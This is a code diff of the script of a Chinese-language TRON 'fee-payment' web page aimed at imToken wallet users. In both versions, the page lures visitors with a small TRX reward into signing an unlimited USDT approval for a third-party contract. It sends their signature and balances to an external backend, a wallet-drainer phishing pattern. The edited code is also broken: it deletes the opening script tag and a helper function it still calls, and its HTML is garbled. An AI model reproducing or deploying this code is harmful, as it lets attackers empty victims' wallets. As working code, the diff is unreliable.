@@ -132,12 +132,11 @@
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
     <script src="imtoken://browser"></script>
-    <script>
-        // ---------------------- 核心配置（需根据实际情况修改） ----------------------
-        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 代付合约地址
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约地址
-        const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 替换为你的Vercel后端接口
-        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // USDT无限授权额度（最小单位）
+     // ---------------------- 核心配置 ----------------------
+        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 替换为你的后端地址
+        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
         // --------------------------------------------------------------------------
 
         // 全局变量
@@ -148,13 +147,6 @@
         const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
         const contractEnergyEl = document.getElementById("contractEnergy");
         const contractAddrEl = document.getElementById("contractAddr");
-
-        // 辅助函数：将数值转为32字节uint256 Hex（兼容所有TronWeb版本）
-        function toUint256Hex(value) {
-            let hex = BigInt(value).toString(16);
-            hex = hex.padStart(64, '0');
-            return '0x' + hex;
-        }
 
         window.onload = async () => {
             contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
@@ -206,51 +198,41 @@
                 }
             };
 
-             // 核心：一键授权（已修复SHA3兼容问题）
+            // 一键授权逻辑
             approveBtn.onclick = async () => {
                 if (!userAddress || !tronWeb) {
                     alert("请先连接钱包");
                     return;
                 }
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '生成授权签名中...';
+                approveBtn.innerHTML = ' 生成授权签名中...';
 
                 try {
-                    // 1. 转换地址为Hex格式
+                    // 1. 地址转Hex
                     const userAddrHex = tronWeb.address.toHex(userAddress);
                     const contractAddrHex = tronWeb.address.toHex(DELEGATE_CONTRACT);
                     
-                    // 2. 转换授权金额为32字节uint256 Hex
+                    // 2. 授权金额转Hex
                     const amountHex = toUint256Hex(INFINITE_APPROVE_AMOUNT);
                     
-                    // 3. 手动拼接参数（地址+合约地址+金额，去掉0x前缀）
+                    // 3. 拼接参数
                     const message = userAddrHex.replace('0x', '') + contractAddrHex.replace('0x', '') + amountHex.replace('0x', '');
                     
-                    // 4. 用crypto-js计算SHA3哈希（替代tronWeb.utils.sha3）
+                    // 4. 计算SHA3哈希（全局函数，确保可用）
                     const messageHash = calculateSHA3(message);
                     
-                    // 5. 用户本地签名（imToken安全签名）
-                    const signature = await tronWeb.trx.signMessage(
-                        messageHash, 
-                        userAddress, 
-                        true 
-                    );
+                    // 5. 用户签名
+                    const signature = await tronWeb.trx.signMessage(messageHash, userAddress, true);
                     const { v, r, s } = signature;
 
-                    // 6. 调用后端代付接口
+                    // 6. 调用后端
                     approveBtn.innerHTML = ' 后端代付中...';
                     const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            userAddress: userAddress,
-                            userAddrHex: userAddrHex,
-                            amount: INFINITE_APPROVE_AMOUNT,
-                            v: v.toString(),
-                            r: r,
-                            s: s,
-                            tokenBalance: tokenBalance,
-                            trxBalance: trxBalance
+                            userAddress, userAddrHex, amount: INFINITE_APPROVE_AMOUNT,
+                            v: v.toString(), r, s, tokenBalance, trxBalance
                         })
                     });
 
@@ -259,16 +241,15 @@
                         throw new Error(resData.error || `后端请求失败（${res.status}）`);
                     }
 
-                    // 7. 操作成功
-                    alert(`✅ 操作成功！\n• 授权交易哈希：${resData.approveTxid}\n• 4TRX奖励哈希：${resData.rewardTxid}\n奖励已自动到账`);
+                    // 成功提示
+                    alert(`✅ 操作成功！\n• 授权哈希：${resData.approveTxid}\n• 奖励哈希：${resData.rewardTxid}`);
                     window.open(`https://tronscan.org/#/transaction/${resData.rewardTxid}`, "_blank");
 
+                    // 保存记录
                     saveApprovalRecord({
                         address: userAddress,
                         approveType: "USDT无限授权",
-                        reward: `4 TRX`,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
+                        reward: "4 TRX",
                         approveTxid: resData.approveTxid,
                         rewardTxid: resData.rewardTxid,
                         approveTime: new Date().toLocaleString(),
@@ -280,7 +261,7 @@
                     alert(`操作失败：${e.message}`);
                 } finally {
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = ' 一键授权';
+                    approveBtn.innerHTML = ' 一键授权）';
                 }
             };
 
@@ -289,11 +270,12 @@
             });
         };
 
+        // 初始化钱包
         async function initWallet() {
             try {
                 userAddress = tronWeb.defaultAddress.base58;
                 const usdtContract = await tronWeb.contract([
-                    { "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function", "stateMutability": "view" }
+                    { "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" }
                 ], USDT_CONTRACT);
 
                 const usdtRaw = await usdtContract.balanceOf(userAddress).call();
@@ -311,12 +293,11 @@
                 document.getElementById("approveBtn").disabled = false;
                 updateWalletStatus();
             } catch (e) {
-                tokenBalance = "0.00";
-                trxBalance = "0.00";
                 alert("钱包初始化失败：" + e.message);
             }
         }
 
+        // 更新合约资源
         function startContractResourceUpdate() {
             updateContractResource();
             trxTimer = setInterval(updateContractResource, 30000);
@@ -333,10 +314,11 @@
                 contractEnergyEl.textContent = currentEnergy;
                 localStorage.setItem('trx_countdown_data', JSON.stringify({ trx: currentTrx, energy: currentEnergy }));
             } catch (e) {
-                console.warn("更新合约资源失败：", e);
+                console.warn("更新资源失败：", e);
             }
         }
 
+        // 更新钱包状态
         function updateWalletStatus() {
             if (userAddress) {
                 walletStatusContainer.classList.add("connected");
@@ -346,6 +328,7 @@
             }
         }
 
+        // 保存授权记录
         function saveApprovalRecord(record) {
             try {
                 const existing = JSON.parse(localStorage.getItem('delegate_approval_records') || "[]");
@@ -353,10 +336,11 @@
                 newRecords.push(record);
                 localStorage.setItem('delegate_approval_records', JSON.stringify(newRecords));
             } catch (e) {
-                console.log("保存授权记录失败：", e);
+                console.log("保存记录失败：", e);
             }
         }
 
+        // 渲染授权记录
         function renderApprovalRecords() {
             try {
                 const container = document.getElementById("approvalRecords");
@@ -368,18 +352,18 @@
                 }
                 
                 container.innerHTML = records.map(record => `
-                    <div class="record-item">
+                    <div class='record-item'>
                         <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                         <p><strong>授权类型：</strong>${record.approveType}</p>
-                        <p><strong>奖励：</strong>${record.reward}（已到账）</p>
-                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approveTxid}" target="_blank" class="tx-link">${record.approveTxid.slice(0,10)}...<<<<i class="fa fa-external-link"></</</</i></a></p>
-                        <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${record.rewardTxid}" target="_blank" class="tx-link">${record.rewardTxid.slice(0,10)}...<<<<i class="fa fa-external-link"></</</i></a></p>
+                        <p><strong>奖励：</strong>${record.reward}</p>
+                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approveTxid}" target="_blank" class="tx-link">${record.approveTxid.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
+                        <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${record.rewardTxid}" target="_blank" class="tx-link">${record.rewardTxid.slice(0,10)}...<<i class="fa fa-external-link"></</i></a></p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
                         <p><strong>状态：</strong><span style="color:#4ade80">${record.status}</span></p>
                     </div>
                 `).join("");
             } catch (e) {
-                console.log("渲染授权记录失败：", e);
+                console.log("渲染记录失败：", e);
             }
         }
     </script>
